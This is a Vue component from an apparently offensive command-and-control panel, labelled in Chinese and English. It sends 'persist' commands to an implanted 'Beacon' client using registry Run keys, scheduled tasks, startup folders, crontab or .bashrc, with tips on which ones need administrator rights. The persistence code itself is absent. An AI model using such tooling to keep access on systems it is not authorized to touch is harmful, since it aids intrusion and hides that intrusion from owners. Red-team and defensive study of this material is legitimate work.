<template>
  <div class="cs-startup-view cs-font-ui">
    <!-- CS Toolbar -->
    <div class="cs-startup-toolbar">
      <div class="toolbar-title-group">
        <span class="toolbar-title">{{ isZh ? '开机启动（持久化驻留）' : 'Persistence & Startup' }}</span>
        <span class="toolbar-hint">{{ isZh ? '选择持久化方式将客户端植入目标系统，执行结果在命令控制查看' : 'Select persistence method to maintain access across reboots' }}</span>
      </div>
    </div>

    <!-- Main Body -->
    <div class="cs-startup-body">
      <div class="cs-startup-section">
        <div class="cs-form-row">
          <label class="cs-form-label">{{ isZh ? '服务 / 任务名称:' : 'Service / Task Name:' }}</label>
          <el-input
            v-model="customName"
            :placeholder="isZh ? '自定义名称（可选，默认 BladeShellSvc）' : 'Custom Name (optional, default BladeShellSvc)'"
            size="small"
            style="width: 320px"
            clearable
          />
        </div>
      </div>

      <!-- Windows Persistence Group -->
      <div class="cs-group-box">
        <div class="group-title">Windows {{ isZh ? '持久化策略' : 'Persistence Methods' }}</div>
        <div class="group-content">
          <div class="btn-grid">
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="persist('registry')"
            >
              {{ loading === 'registry' ? (isZh ? '执行中...' : 'Running...') : (isZh ? '注册表 Run 键 (Registry Run)' : 'Registry Run Key') }}
            </button>
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="persist('schtasks')"
            >
              {{ loading === 'schtasks' ? (isZh ? '执行中...' : 'Running...') : (isZh ? '计划任务 (Scheduled Tasks)' : 'Scheduled Task') }}
            </button>
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="persist('startup')"
            >
              {{ loading === 'startup' ? (isZh ? '执行中...' : 'Running...') : (isZh ? '启动文件夹 (Startup Folder)' : 'Startup Folder') }}
            </button>
          </div>
          <div class="group-tip">
            {{ isZh ? '说明：注册表 Run 键无需管理员权限；计划任务与启动文件夹建议提权后执行。' : 'Note: Registry Run key does not require Administrator rights; Tasks and Startup folder benefit from elevated privileges.' }}
          </div>
        </div>
      </div>

      <!-- Linux Persistence Group -->
      <div class="cs-group-box">
        <div class="group-title">Linux {{ isZh ? '持久化策略' : 'Persistence Methods' }}</div>
        <div class="group-content">
          <div class="btn-grid">
            <button
              class="cs-btn"
              :disabled="loading !== ''"
              @click="persist('cron')"
            >
              {{ loading === 'cron' ? (isZh ? '执行中...' : 'Running...') : (isZh ? '定时任务 (Crontab)' : 'Crontab') }}
            </button>
            <button
              class="cs-btn"
              :disabled="loading !== ''"
              @click="persist('bashrc')"
            >
              {{ loading === 'bashrc' ? (isZh ? '执行中...' : 'Running...') : (isZh ? '环境脚本 (.bashrc)' : 'Bashrc Profile') }}
            </button>
          </div>
          <div class="group-tip">
            {{ isZh ? '说明：Linux 下 cron 与 bashrc 默认持久化至当前登录用户环境变量。' : 'Note: Linux cron and bashrc persistence take effect for the current user profile.' }}
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, ref } from 'vue'
import { ElMessage } from 'element-plus'
import ClientAPI from '@/api/clients'
import { useI18nStore } from '@/stores/i18n'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const injectedUid = inject('realUid', null) as any
const getUid = () => {
  const v = injectedUid && injectedUid.value ? String(injectedUid.value) : ''
  return v && v.length > 10 ? v : ''
}

const loading = ref('')
const customName = ref('')

const persist = async (method: string) => {
  const uid = getUid()
  if (!uid) {
    ElMessage.warning(isZh.value ? '客户端未就绪' : 'Beacon session not ready')
    return
  }
  loading.value = method
  const name = customName.value.trim()
  const cmd = name ? `persist ${method} ${name}` : `persist ${method}`
  try {
    await ClientAPI.send_commands({ uid, command: cmd })
    ElMessage.success(isZh.value ? `已下发持久化指令: ${method}，请在命令控制查看结果` : `Persistence command dispatched: ${method}`)
  } catch (e) {
    ElMessage.error(isZh.value ? '下发失败' : 'Failed to dispatch command')
  } finally {
    loading.value = ''
  }
}
</script>

<style scoped>
.cs-startup-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-panel);
  overflow-y: auto;
}

.cs-startup-toolbar {
  height: 32px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  padding: 0 12px;
  flex-shrink: 0;
}

.toolbar-title {
  font-size: 12px;
  font-weight: bold;
  color: var(--cs-text-bright);
}

.toolbar-hint {
  font-size: 11px;
  color: var(--cs-text-dim);
  margin-left: 12px;
}

.cs-startup-body {
  padding: 14px 18px;
  display: flex;
  flex-direction: column;
  gap: 14px;
  max-width: 680px;
}

.cs-form-row {
  display: flex;
  align-items: center;
  gap: 10px;
}

.cs-form-label {
  font-size: 12px;
  color: var(--cs-text);
  font-weight: 500;
  width: 140px;
}

.cs-group-box {
  border: 1px solid var(--cs-border);
  background: var(--cs-bg);
  border-radius: 2px;
  padding: 12px 14px;
}

.group-title {
  font-size: 12px;
  font-weight: 600;
  color: var(--cs-text-bright);
  margin-bottom: 10px;
  border-bottom: 1px solid var(--cs-border);
  padding-bottom: 4px;
}

.btn-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}

.group-tip {
  margin-top: 10px;
  font-size: 11px;
  color: var(--cs-text-dim);
  line-height: 1.5;
}
</style>
